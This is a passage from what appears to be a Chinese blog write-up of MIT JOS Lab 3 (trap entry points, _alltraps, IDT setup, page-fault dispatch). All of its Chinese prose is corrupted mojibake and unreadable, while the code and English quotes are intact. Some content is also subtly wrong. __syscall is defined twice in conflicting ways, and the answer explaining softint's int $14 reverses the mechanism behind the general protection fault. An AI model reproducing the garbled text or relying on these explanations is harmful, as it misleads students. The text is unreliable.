able to get make grade to succeed on the <code>divzero</code>, <code>softint</code>, and <code>badsegment</code> tests at this point.</p></blockquote><p>æˆ‘ä»¬éœ€è¦åœ¨ <code>trapentry.S</code> ä¸­å»ºç«‹ä¸­æ–­å…¥å£ç‚¹ï¼Œè¿™é‡Œ JOS é¢„å…ˆä¸ºæˆ‘ä»¬æä¾›äº†ä¸¤ä¸ªå®ç”¨æ¥å£°æ˜è¿™äº›å…¥å£ç‚¹ï¼Œä»–ä»¬æœ€ç»ˆéƒ½ä¼šè·³è½¬åˆ° <code>_alltraps</code> æ ‡å·å¤„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">* TRAPHANDLER defines a globally-visible function <span class="keyword">for</span> handling a trap.</span><br><span class="line"> * It pushes a trap number onto the <span class="built_in">stack</span>, then jumps to _alltraps.</span><br><span class="line"> * Use TRAPHANDLER <span class="keyword">for</span> traps where the CPU automatically pushes an error code.</span><br><span class="line"> *</span><br><span class="line"> * You shouldn<span class="number">&#x27;</span>t call a TRAPHANDLER function from C, but you may</span><br><span class="line"> * need to _declare_ one in <span class="title function_">C</span> <span class="params">(<span class="keyword">for</span> instance, to get a function pointer</span></span><br><span class="line"><span class="params"> * during IDT setup)</span>.  You can declare the function with</span><br><span class="line"> *   <span class="type">void</span> <span class="title function_">NAME</span><span class="params">()</span>;</span><br><span class="line"> * where NAME is the argument passed to TRAPHANDLER.</span><br><span class="line"> */</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRAPHANDLER(name, num)\</span></span><br><span class="line"><span class="meta">.globl name;<span class="comment">/* define global symbol for &#x27;name&#x27; */</span>\</span></span><br><span class="line"><span class="meta">.type name, @function;<span class="comment">/* symbol type is function */</span>\</span></span><br><span class="line"><span class="meta">.align 2;<span class="comment">/* align function definition */</span>\</span></span><br><span class="line"><span class="meta">name:<span class="comment">/* function starts here */</span>\</span></span><br><span class="line"><span class="meta">pushl $(num);\</span></span><br><span class="line"><span class="meta">jmp _alltraps</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Use TRAPHANDLER_NOEC for traps where the CPU doesn&#x27;t push an error code.</span></span><br><span class="line"><span class="comment"> * It pushes a 0 in place of the error code, so the trap frame has the same</span></span><br><span class="line"><span class="comment"> * format in either case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRAPHANDLER_NOEC(name, num)\</span></span><br><span class="line"><span class="meta">.globl name;\</span></span><br><span class="line"><span class="meta">.type name, @function;\</span></span><br><span class="line"><span class="meta">.align 2;\</span></span><br><span class="line"><span class="meta">name:\</span></span><br><span class="line"><span class="meta">pushl $0;\</span></span><br><span class="line"><span class="meta">pushl $(num);\</span></span><br><span class="line"><span class="meta">jmp _alltraps</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆå‚ç…§ <code>inc/trap.h</code> ä¸­æä¾›çš„ <code>T_*</code> å®å£°æ˜å¯¹åº”å…¥å£ç‚¹ï¼Œå¯¹äºä¼šæœ‰ error code çš„ä¸­æ–­ä½¿ç”¨ <code>TRAPHANDLER</code> å®ï¼Œå¦åˆ™ä½¿ç”¨ </p><p><code>TRAPHANDLER_NOEC</code> å®ï¼Œæ˜¯å¦æœ‰ error code å‚è§ä¸Šé¢çš„è¡¨æ ¼ï¼›å®é‡Œçš„ <code>name</code> å­—æ®µå¥½åƒæ˜¯å¯ä»¥éšæ„å£°æ˜çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lab 3: Your code here for generating entry points for the different traps.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">TRAPHANDLER_NOEC(int0, T_DIVIDE)</span><br><span class="line">TRAPHANDLER_NOEC(int1, T_DEBUG)</span><br><span class="line">TRAPHANDLER_NOEC(int2, T_NMI)</span><br><span class="line">TRAPHANDLER_NOEC(int3, T_BRKPT)</span><br><span class="line">TRAPHANDLER_NOEC(int4, T_OFLOW)</span><br><span class="line">TRAPHANDLER_NOEC(int5, T_BOUND)</span><br><span class="line">TRAPHANDLER_NOEC(int6, T_ILLOP)</span><br><span class="line">TRAPHANDLER_NOEC(int7, T_DEVICE)</span><br><span class="line">TRAPHANDLER(int8, T_DBLFLT)</span><br><span class="line"></span><br><span class="line">TRAPHANDLER(int10, T_TSS)</span><br><span class="line">TRAPHANDLER(int11, T_SEGNP)</span><br><span class="line">TRAPHANDLER(int12, T_STACK)</span><br><span class="line">TRAPHANDLER(int13, T_GPFLT)</span><br><span class="line">TRAPHANDLER(int14, T_PGFLT)</span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(int16, T_FPERR)</span><br><span class="line">TRAPHANDLER_NOEC(__syscall, T_SYSCALL)</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯å®ç° <code>_alltraps</code>ï¼ŒæŒ‰æ³¨é‡Šæˆ‘ä»¬åº”å½“å‘æ ˆä¸Šå‹å…¥å¯¹åº”æ•°æ®å½¢æˆä¸€ä¸ª <code>Trapframe</code> ç»“æ„ä½“ï¼Œå®é™…ä¸Šåªéœ€è¦æ¨å…¥ esã€dsã€<code>PushRegs</code> ç»“æ„ä½“ï¼Œå‰©ä½™çš„éƒ½ä¼šåœ¨æˆ‘ä»¬è¿è¡Œåˆ° <code>_alltraps</code> å‰è¢«å‹å…¥æ ˆä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> &#123;</span></span><br><span class="line"><span class="comment">/* registers as pushed by pusha */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_edi;</span><br><span class="line"><span class="type">uint32_t</span> reg_esi;</span><br><span class="line"><span class="type">uint32_t</span> reg_ebp;</span><br><span class="line"><span class="type">uint32_t</span> reg_oesp;<span class="comment">/* Useless */</span></span><br><span class="line"><span class="type">uint32_t</span> reg_ebx;</span><br><span class="line"><span class="type">uint32_t</span> reg_edx;</span><br><span class="line"><span class="type">uint32_t</span> reg_ecx;</span><br><span class="line"><span class="type">uint32_t</span> reg_eax;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PushRegs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line"><span class="type">uint16_t</span> tf_es;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding1;</span><br><span class="line"><span class="type">uint16_t</span> tf_ds;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding2;</span><br><span class="line"><span class="type">uint32_t</span> tf_trapno;</span><br><span class="line"><span class="comment">/* below here defined by x86 hardware */</span></span><br><span class="line"><span class="type">uint32_t</span> tf_err;</span><br><span class="line"><span class="type">uintptr_t</span> tf_eip;</span><br><span class="line"><span class="type">uint16_t</span> tf_cs;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding3;</span><br><span class="line"><span class="type">uint32_t</span> tf_eflags;</span><br><span class="line"><span class="comment">/* below here only when crossing rings, such as from user to kernel */</span></span><br><span class="line"><span class="type">uintptr_t</span> tf_esp;</span><br><span class="line"><span class="type">uint16_t</span> tf_ss;</span><br><span class="line"><span class="type">uint16_t</span> tf_padding4;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ padding å…¶å®ä¸éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å‹å…¥æ ˆä¸Šï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ <code>pushl</code> æŒ‡ä»¤å‹å…¥ ds ä¸ es æ—¶ä»–ä»¬ä¼šè‡ªåŠ¨æ‰©å±•ä¸º 4 å­—èŠ‚ï¼›ä¹‹åæˆ‘ä»¬è¿˜éœ€è¦å°† ds ä¸ es çš„å€¼è®¾ä¸º <code>GD_KD</code>ï¼Œæœ€åå‹å…¥ esp åæ‰‹åŠ¨è°ƒç”¨ <code>trap()</code> å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lab 3: Your code here for _alltraps</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">_alltraps:</span><br><span class="line">pushl %ds</span><br><span class="line">pushl %es</span><br><span class="line">pushal</span><br><span class="line">push $GD_KD</span><br><span class="line">popl %ds</span><br><span class="line">push $GD_KD</span><br><span class="line">popl %es</span><br><span class="line">pushl %esp</span><br><span class="line">call trap</span><br></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨ <code>SETGATE</code> å®åœ¨ <code>trap_init()</code> ä¸­è£…è½½ä¸­æ–­æè¿°ç¬¦ï¼Œå…¶æ¥æ”¶çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª <code>Gatedesc</code> ç±»å‹ç»“æ„ä½“ï¼Œç”¨æ¥è¡¨ç¤ºä¸€ä¸ªé—¨æè¿°ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gate descriptors for interrupts and traps</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Gatedesc</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> gd_off_15_0 : <span class="number">16</span>;   <span class="comment">// low 16 bits of offset in segment</span></span><br><span class="line"><span class="type">unsigned</span> gd_sel : <span class="number">16</span>;        <span class="comment">// segment selector</span></span><br><span class="line"><span class="type">unsigned</span> gd_args : <span class="number">5</span>;        <span class="comment">// # args, 0 for interrupt/trap gates</span></span><br><span class="line"><span class="type">unsigned</span> gd_rsv1 : <span class="number">3</span>;        <span class="comment">// reserved(should be zero I guess)</span></span><br><span class="line"><span class="type">unsigned</span> gd_type : <span class="number">4</span>;        <span class="comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span></span><br><span class="line"><span class="type">unsigned</span> gd_s : <span class="number">1</span>;           <span class="comment">// must be 0 (system)</span></span><br><span class="line"><span class="type">unsigned</span> gd_dpl : <span class="number">2</span>;         <span class="comment">// descriptor(meaning new) privilege level</span></span><br><span class="line"><span class="type">unsigned</span> gd_p : <span class="number">1</span>;           <span class="comment">// Present</span></span><br><span class="line"><span class="type">unsigned</span> gd_off_31_16 : <span class="number">16</span>;  <span class="comment">// high bits of offset in segment</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸º<strong>æˆ‘ä»¬è¿˜æ²¡æœ‰å®šä¹‰ä»»ä½•å¤„ç†å‡½æ•°æ‰€ä»¥ç›´æ¥å£°æ˜æ–°çš„å‡½æ•°å³å¯</strong>ï¼Œç°åœ¨è¿˜æ²¡æœ‰å‡ºç°é™·é˜±æ‰€ä»¥éƒ½æ˜¯æ™®é€šçš„ä¸­æ–­ï¼Œè¿™é‡Œæ³¨æ„ç³»ç»Ÿè°ƒç”¨ä¸è°ƒè¯•ä¸­æ–­çš„ç‰¹æƒçº§åº”è®¾ä¸º3ï¼Œå› ä¸ºç”¨æˆ·è¿›ç¨‹éœ€è¦èƒ½å¤Ÿè®¿é—®å…¶å…¥å£ç‚¹ï¼š</p><blockquote><p>ä¸€å¼€å§‹ç¬”è€…åœ¨æƒ³ï¼Œå¥½åƒè¿˜æ²¡æœ‰å‡½æ•°å®šä¹‰å•Šï¼Œåé¢çœ‹äº†ä¸€çœ¼åˆ«äººçš„å®éªŒæŠ¥å‘Šï¼Œç›´æ¥å£°æ˜æ–°çš„å‡½æ•°ï¼Œè¿˜æ²¡æœ‰å‡½æ•°ä½“ï¼Œå±å®ä½©æœâ€¦</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">Segdesc</span> <span class="title">gdt</span>[];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// declaration</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">int0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int1</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int2</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int3</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int4</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int5</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int6</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int7</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int8</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">int10</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int11</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int12</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int13</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">int14</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">int16</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> __syscall()</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">&quot;syscall!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set up IDT</span></span><br><span class="line">SETGATE(idt[T_DIVIDE], <span class="number">0</span>, GD_KT, int0, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEBUG], <span class="number">0</span>, GD_KT, int1, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_NMI], <span class="number">0</span>, GD_KT, int2, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BRKPT], <span class="number">0</span>, GD_KT, int3, <span class="number">3</span>);</span><br><span class="line">SETGATE(idt[T_OFLOW], <span class="number">0</span>, GD_KT, int4, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BOUND], <span class="number">0</span>, GD_KT, int5, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_ILLOP], <span class="number">0</span>, GD_KT, int6, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEVICE], <span class="number">0</span>, GD_KT, int7, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DBLFLT], <span class="number">0</span>, GD_KT, int8, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">SETGATE(idt[T_TSS], <span class="number">0</span>, GD_KT, int10, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SEGNP], <span class="number">0</span>, GD_KT, int11, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_STACK], <span class="number">0</span>, GD_KT, int12, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_GPFLT], <span class="number">0</span>, GD_KT, int13, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_PGFLT], <span class="number">0</span>, GD_KT, int14, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">SETGATE(idt[T_FPERR], <span class="number">0</span>, GD_KT, int16, <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SYSCALL], <span class="number">0</span>, GD_KT, __syscall, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-CPU setup </span></span><br><span class="line">trap_init_percpu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¬”è€…å°† syscall å®šä¹‰ä¸ºä¸€ä¸ªæ‰“å°å‡½æ•°ï¼Œè¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼ŒæˆåŠŸé€šè¿‡ä¸­æ–­é—¨å®Œæˆäº†ç³»ç»Ÿè°ƒç”¨ï¼š</p><p><img src="https://s2.loli.net/2022/03/17/O9Y6lED152vKHIZ.png" alt="image.png"></p><p>å½“ç„¶ï¼Œåé¢ panic æ‰äº†ï¼Œå› ä¸ºæˆ‘ä»¬çš„ä¸­æ–­å¤„ç†ç¨‹åºæ²¡æœ‰å®Œæˆ</p><blockquote><p>è¿™ä¸ªæ—¶å€™è¿è¡Œè¯„åˆ†ç¨‹åºåº”å½“æœ‰ 30 åˆ†</p></blockquote><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹ Challengeï¼Œè®©æˆ‘ä»¬è‡ªåŠ¨åŒ–ç”Ÿæˆä¸€ä¸ª tableï¼š</p><blockquote><p><em>Challenge!</em> You probably have a lot of very similar code right now, between the lists of <code>TRAPHANDLER</code> in <code>trapentry.S</code> and their installations in <code>trap.c</code>. Clean this up. Change the macros in <code>trapentry.S</code> to automatically generate a table for <code>trap.c</code> to use. Note that you can switch between laying down code and data in the assembler by using the directives <code>.text</code> and <code>.data</code>.</p></blockquote><p><del>ä¸ä¼šåšï¼Œæ‘¸äº†</del></p><p>æœ€åæ˜¯ä¹ é¢˜ Timeï¼š</p><blockquote><p><strong>Questions</strong></p><p>Answer the following questions in your <code>answers-lab3.txt</code>:</p><ol><li><p>What is the purpose of having an individual handler function for each exception&#x2F;interrupt? (i.e., if all exceptions&#x2F;interrupts were delivered to the same handler, what feature that exists in the current implementation could not be provided?)</p><p>ç¬”è€…åªèƒ½æƒ³åˆ°æ˜¯ä¸ºäº†é™ä½ä»£ç çš„è€¦åˆæ€§ï¼Œå› ä¸ºå…¶å®å¹¶éæ˜¯ä¸èƒ½å…¨éƒ¨é€šè¿‡åŒä¸€å‡½æ•°å®ç°ä¸­æ–­å¤„ç†ï¼Œåªä¸è¿‡æ˜¯æŠŠå„ä¸ªä¸­æ–­å¤„ç†ç¨‹åºå¡åˆ°ä¸­æ–­å…¥å£ç‚¹é‡Œç½¢äº†</p></li><li><p>Did you have to do anything to make the <code>user/softint</code> program behave correctly? The grade script expects it to produce a general protection fault (trap 13), but <code>softint</code>â€˜s code says <code>int $14</code>. <em>Why</em> should this produce interrupt vector 13? What happens if the kernel actually allows <code>softint</code>â€˜s <code>int $14</code> instruction to invoke the kernelâ€™s page fault handler (which is interrupt vector 14)?</p><p>å› ä¸º General Protection Fault å±äº 0 ç‰¹æƒçº§ï¼Œç”¨æˆ·æ€æ— æƒé™è§¦å‘ï¼Œå› æ­¤åœ¨è®¿é—®å…¶å‘é‡æ—¶ä¼šè§¦å‘ Page Fault</p></li></ol></blockquote><p>æ¥ä¸‹æ¥è¿›å…¥ Part Bï¼Œç»§ç»­å®Œå–„æˆ‘ä»¬çš„ä¸­æ–­å¤„ç†ç¨‹åº</p><h2 id="Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls"><a href="#Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls" class="headerlink" title="Part B: Page Faults, Breakpoints Exceptions, and System Calls"></a>Part B: Page Faults, Breakpoints Exceptions, and System Calls</h2><p>æœ¬èŠ‚ä¸­æˆ‘ä»¬å°†æ”¹è¿›ä¸­æ–­å¤„ç†ä»£ç ä»¥å®ç°ä¸€äº›éœ€è¦é€šè¿‡å¼‚å¸¸å¤„ç†å®ç°çš„é‡è¦çš„åŸè¯­</p><h3 id="Handling-Page-Faults"><a href="#Handling-Page-Faults" class="headerlink" title="Handling Page Faults"></a>Handling Page Faults</h3><p>ç¼ºé¡µå¼‚å¸¸æ˜¯ä¸€ä¸ªååˆ†é‡è¦çš„æœºåˆ¶ï¼Œå‡ºäºæ€§èƒ½çš„è€ƒè™‘ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦åœ¨ä¸€å¼€å§‹å°±ä¸ºå¯¹åº”çº¿æ€§åœ°å€åˆ†é…ç‰©ç†é¡µï¼Œè€Œå¯ä»¥åœ¨è®¿é—®åˆ°ä»–ä»¬æ—¶è§¦å‘ç¼ºé¡µå¼‚å¸¸åå†åˆ†é…ç‰©ç†é¡µï¼ˆä¾‹å¦‚ mmap æ˜ å°„åŒºåŸŸï¼‰</p><p>å½“è§¦å‘ç¼ºé¡µå¼‚å¸¸æ—¶ï¼Œå¤„ç†å™¨ä¼šå°†é€ æˆç¼ºé¡µå¼‚å¸¸çš„çº¿æ€§åœ°å€å­˜æ”¾åœ¨ cr2 å¯„å­˜å™¨ä¸­ï¼ŒJOS æä¾›äº†ä¸€ä¸ªç¼ºé¡µå¼‚å¸¸å¤„ç†å‡½æ•° <code>page_fault_handler()</code>ï¼Œåœ¨æ¥ä¸‹æ¥çš„ Exercise 5 ä¸­æˆ‘ä»¬éœ€è¦ä¿®æ”¹ <code>trap_dispatch()</code> ä»¥å¤„ç†ç¼ºé¡µå¼‚å¸¸</p><blockquote><p><strong>Exercise 5.</strong> Modify <code>trap_dispatch()</code> to dispatch page fault exceptions to <code>page_fault_handler()</code>. You should now be able to get make grade to succeed on the <code>faultread</code>, <code>faultreadkernel</code>, <code>faultwrite</code>, and <code>faultwritekernel</code> tests. If any of them donâ€™t work, figure out why and fix them. Remember that you can boot JOS into a particular user program using make run-<em>x</em> or make run-<em>x</em>-nox. For instance, make run-hello-nox runs the <em>hello</em> user program.</p></blockquote><p>ç¬”è€…ç›´æ¥ç”¨ä¸€ä¸ªå¤§çš„ switch è¿›è¡Œæ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">trap_dispatch</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Handle processor exceptions.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">switch</span>(tf-&gt;tf_trapno)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> T_DIVIDE:</span><br><span class="line"><span class="keyword">case</span> T_DEBUG:</span><br><span class="line"><span class="keyword">case</span> T_NMI:</span><br><span class="line"><span class="keyword">case</span> T_BRKPT:</span><br><span class="line"><span class="keyword">case</span> T_OFLOW:</span><br><span class="line"><span class="keyword">case</span> T_BOUND:</span><br><span class="line"><span class="keyword">case</span> T_ILLOP:</span><br><span class="line"><span class="keyword">case</span> T_DEVICE:</span><br><span class="line"><span class="keyword">case</span> T_DBLFLT:</span><br><span class="line"><span class="keyword">case</span> T_TSS:</span><br><span class="line"><span class="keyword">case</span> T_SEGNP:</span><br><span class="line"><span class="keyword">case</span> T_STACK:</span><br><span class="line"><span class="keyword">case</span> T_GPFLT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> T_PGFLT:</span><br><span class="line">page_fault_handler(tf);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line"><span class="keyword">case</span> T_FPERR:</span><br><span class="line"><span class="keyword">case</span> T_ALIGN:</span><br><span class="line"><span class="keyword">case</span> T_MCHK:</span><br><span class="line"><span class="keyword">case</span> T_SIMDERR:</span><br><span class="line"><span class="keyword">case</span> T_SYSCALL:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unexpected trap: The user process or the kernel has a bug.</span></span><br><span class="line">print_trapframe(tf);</span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_cs == GD_KT)</span><br><span class="line">panic(<span class="string">&quot;unhandled trap in kernel&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">env_destroy(curenv);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¯„åˆ†ç¨‹åºï¼ŒæˆåŠŸé€šè¿‡ç¼ºé¡µå¼‚å¸¸éƒ¨åˆ†ï¼š</p><p><img src="https://s2.loli.net/2022/03/17/6CYuBxpQh5njEvP.png" alt="image.png"></p><h3 id="The-Breakpoint-Exception"><a href="#The-Breakpoint-Exception" class="headerlink" title="The Breakpoint Exception"></a>The Breakpoint Exception</h3><p>æ–­ç‚¹å¼‚å¸¸é€šå¸¸è¢«ç”¨äºè°ƒè¯•ç¨‹åºï¼Œè°ƒè¯•åŸç†æ˜¯å°†ç¨‹åºä¸­å¯¹åº”æŒ‡ä»¤æ›¿æ¢ä¸º int3 è½¯ä¸­æ–­ï¼›åœ¨ JOS ä¸­æˆ‘ä»¬å°†å…¶è½¬åŒ–ä¸ºä»»ä½•ç”¨æˆ·ç¯å¢ƒéƒ½å¯ä»¥å”¤é†’ä¸€ä¸ª JOS kernel monitor çš„ä¸€ä¸ªâ€œä¼ªç³»ç»Ÿè°ƒç”¨â€</p><p>æ¥ä¸‹æ¥æ˜¯ Exercise 6ï¼Œè¡¥å®Œ <code>trap_dispatch()</code> 